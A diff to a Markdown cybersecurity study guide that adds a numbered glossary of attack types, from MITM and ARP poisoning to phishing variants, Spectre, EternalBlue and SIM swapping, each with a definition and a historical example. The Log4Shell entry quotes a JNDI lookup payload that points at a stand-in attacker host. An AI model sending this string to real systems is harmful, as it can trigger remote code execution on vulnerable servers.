@@ -106,7 +106,361 @@
 **Real-World Example:** <br>
 ℹ️ Microsoft Exchange Hafnium Attacks (2021): Attackers exploited Exchange zero-day vulnerabilities and deployed web shells on thousands of servers worldwide to maintain persistent remote access.
 
-## 9.
+##
+
+1. Man-in-the-Middle (MITM) Attacks
+
+Definition:
+An attacker secretly intercepts, relays, or alters communication between two parties who believe they’re communicating directly.
+
+Example:
+Attackers on public Wi-Fi capturing login credentials by forcing victims onto a fake access point.
+
+2. Buffer Overflow
+
+Definition:
+Occurs when a program writes more data to a memory buffer than it can hold, allowing attackers to overwrite adjacent memory and execute arbitrary code.
+
+Example:
+The Morris Worm (1988) exploited a buffer overflow in the fingerd service, becoming the first major internet worm.
+
+3. Non-validated Input (Input Validation Failures)
+
+Definition:
+Applications that do not validate or sanitize user input allow attackers to inject malicious data, causing SQLi, XSS, RCE, or logic flaws.
+
+Example:
+Early PHP applications frequently suffered SQL injections due to unvalidated query parameters.
+
+4. Race Conditions
+
+Definition:
+When attackers exploit the timing of operations (e.g., reading and writing data simultaneously) to manipulate logic or escalate privileges.
+
+Example:
+The Dirty COW vulnerability (Linux 2016) exploited a race condition in kernel memory handling to gain root access.
+
+5. Replay Attacks
+
+Definition:
+Attackers capture valid data packets (e.g., login tokens) and resend (replay) them to impersonate a user or repeat actions.
+
+Example:
+Capturing and replaying Kerberos authentication tickets to gain unauthorized access.
+
+6. Zero-Day Vulnerabilities / Exploits
+
+Definition:
+A vulnerability unknown to the vendor; attackers exploit it before a patch exists.
+
+Example:
+Stuxnet used multiple Windows zero-days to infiltrate Iran’s nuclear facility.
+
+7. ARP Poisoning
+
+Definition:
+Attackers send forged ARP responses to map their MAC address to another system’s IP address, enabling MITM attacks.
+
+Example:
+Redirecting traffic between employees and gateways on a LAN.
+
+8. DNS Poisoning (DNS Spoofing)
+
+Definition:
+Manipulating DNS responses so users are directed to malicious sites instead of legitimate ones.
+
+Example:
+2008 DNS cache poisoning attacks redirecting users to fake banking portals.
+
+9. IP Spoofing
+
+Definition:
+Attackers forge the source IP address in packets to appear as another device, often used in DDoS or bypassing IP-based security.
+
+Example:
+TCP SYN flood attacks using spoofed IPs.
+
+10. MAC Spoofing
+
+Definition:
+Changing the MAC address of a network interface to impersonate another device on the LAN.
+
+Example:
+Bypassing MAC-based access controls or DHCP restrictions.
+
+11. DHCP Spoofing
+
+Definition:
+Attackers pose as a rogue DHCP server and provide malicious IP configurations to victims—usually redirecting them to malicious gateways.
+
+Example:
+Providing a fake default gateway to intercept all network traffic.
+
+12. Social Engineering
+
+Definition:
+Manipulating people into performing actions or revealing confidential information.
+
+Example:
+“IT support” calling employees and asking for their passwords.
+
+13. Phishing (and Types)
+Phishing — General
+
+Sending fraudulent messages to trick victims into revealing credentials or installing malware.
+
+Example:
+Fake Office365 password reset emails.
+
+Smishing
+
+Phishing over SMS.
+
+Example:
+Fake delivery notifications prompting card info.
+
+Vishing
+
+Voice-based phishing via phone calls.
+
+Example:
+Fake bank agent requesting account verification.
+
+Spear Phishing
+
+Highly targeted phishing aimed at specific individuals or groups.
+
+Example:
+Targeted emails to finance departments with realistic invoices.
+
+Whaling
+
+Phishing targeted at executives.
+
+Example:
+Fake legal complaint emails sent to CEOs.
+
+CEO / President Fraud
+
+Impersonating executives to trick employees into wiring money or sharing sensitive data.
+
+Example:
+Finance officer tricked into wiring funds after receiving a fake “urgent” request from the CEO.
+
+14. Typo-squatting
+
+Definition:
+Attackers register domains similar to legitimate ones to capture mistyped traffic.
+
+Example:
+“paypaI.com” (with capital i) used to steal PayPal credentials.
+
+15. KRACK (Key Reinstallation Attacks)
+
+Definition:
+A Wi-Fi attack targeting vulnerabilities in WPA2 that allowed attackers to decrypt traffic by forcing key reinstallation.
+
+Example:
+2017 discovery of KRACK affecting nearly all WPA2 devices until patched.
+
+16. DoS and DDoS Attacks
+
+Definition:
+Flooding systems or networks to make them unavailable.
+
+DoS: One attacker/device
+
+DDoS: Many distributed devices (botnets)
+
+Example:
+Mirai botnet DDoS attack on Dyn DNS (2016) disrupting Twitter, Netflix, Reddit.
+
+17. Cryptojacking
+
+Definition:
+Unauthorized use of a victim’s device to mine cryptocurrency.
+
+Example:
+Coinhive-based cryptojacking scripts embedded on compromised websites.
+
+18. Clickjacking
+
+Definition:
+Tricking users into clicking hidden elements on a webpage, often using invisible frames.
+
+Example:
+Invisible “Like” buttons stealing Facebook clicks.
+
+19. Session Hijacking
+
+Definition:
+Stealing or manipulating session IDs to impersonate authenticated users.
+
+Example:
+Stealing session cookies via XSS and accessing user accounts.
+
+20. Rowhammer
+
+Definition:
+Hardware-based attack that flips bits in adjacent DRAM rows by rapidly accessing (hammering) memory addresses.
+
+Example:
+Demonstrated at Google Project Zero, enabling privilege escalation on physical hardware.
+
+21. Meltdown & Spectre (2017)
+
+Definition:
+Side-channel attacks exploiting flaws in modern CPU speculative execution.
+
+Meltdown:
+
+Allows reading kernel memory from user space.
+
+Spectre:
+
+Allows leaking data across application boundaries through branch prediction abuse.
+
+Example:
+Intel/AMD/ARM processors exposed; required OS and firmware patches.
+
+22. Side-Channel Attacks
+
+Definition:
+Extracting information from indirect data like timing, power consumption, electromagnetic leaks.
+
+Example:
+Measuring CPU timing to extract cryptographic keys.
+
+23. EternalBlue
+
+Definition:
+A Windows SMBv1 exploit (from leaked NSA tools) used to execute remote code.
+
+Example:
+Used by WannaCry and NotPetya to cause global damage.
+
+24. Brute-Force Attacks
+
+Definition:
+Systematically trying passwords or encryption keys until the correct one is found.
+
+Example:
+Credential stuffing attacks against corporate VPN portals.
+
+25. Log4j (Log4Shell)
+
+Definition:
+A critical 2021 vulnerability in the Log4j logging library enabling remote code execution through attacker-controlled log entries.
+
+Example:
+Attackers triggered RCE by forcing applications to log crafted strings (${jndi:ldap://attacker.com/...}).
+
+26. COW (Copy-On-Write Exploit)
+
+Definition:
+The “Dirty COW” Linux bug allowed privilege escalation by exploiting a race condition in the kernel’s memory mapping.
+
+Example:
+Attackers gained root privileges by writing to read-only files during the race window.
+
+27. C2 Server Attacks (Command & Control)
+
+Definition:
+Systems attackers use to manage infected machines, send commands, steal data, and deploy additional malware.
+
+Example:
+Zeus botnet C2 servers controlling infected machines for banking credential theft.
+
+28. Wi-Fi Based Attacks
+
+Definition:
+Attacks that target wireless networks.
+
+Common Types:
+
+Evil twin APs
+
+Deauthentication attacks
+
+WPA handshake cracking
+
+Rogue access points
+
+Example:
+Fake public Wi-Fi hotspots used to capture credentials (MITM).
+
+29. Dumpster Diving
+
+Definition:
+Finding sensitive information (passwords, invoices, access cards) in trash bins.
+
+Example:
+Attackers retrieving corporate documents thrown away without shredding.
+
+30. Shoulder Surfing
+
+Definition:
+Looking over someone’s shoulder to capture sensitive information.
+
+Example:
+Capturing ATM PINs or passwords in public spaces.
+
+31. Sniffing
+
+Definition:
+Capturing packets traveling over a network.
+
+Example:
+Using Wireshark on unsecured Wi-Fi to capture credentials sent in plaintext.
+
+32. Snooping
+
+Definition:
+Unauthorized monitoring of private communications or systems.
+
+Example:
+Employees monitoring colleague emails without authorization.
+
+33. Spoofing
+
+Definition:
+Pretending to be another device, user, or process to trick systems or users.
+
+Example:
+Email spoofing used in phishing attacks.
+
+34. SMB Attacks
+
+Definition:
+Exploiting Windows SMB protocol vulnerabilities for remote code execution or credential theft.
+
+Example:
+EternalBlue exploitation of SMBv1 (used by WannaCry).
+
+35. SIM Swapping & Cloning
+SIM Swapping
+
+Attackers convince mobile carriers to port a victim’s phone number to the attacker’s SIM.
+
+Example:
+Crypto investors losing accounts due to attackers intercepting 2FA via swapped SIMs.
+
+SIM Cloning
+
+Copying a SIM card’s identifiers to duplicate a mobile identity.
+
+Example:
+Older GSM SIMs cloned using extracted authentication keys.
+
+36. SYNful Knock (Cisco IOS Backdoor, 2015)
+
+Definition:
+A stealthy, persistent backdoor planted in Cisco routers by modifying IOS firmware. Attackers could send specially crafted packets (a “knock sequence”) to gain remote access.
+
+Example:
+Discovered on compromised Cisco routers across multiple countries; used by advanced threat actors.
+
+## 44. 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Hardware-level Cyber attacks
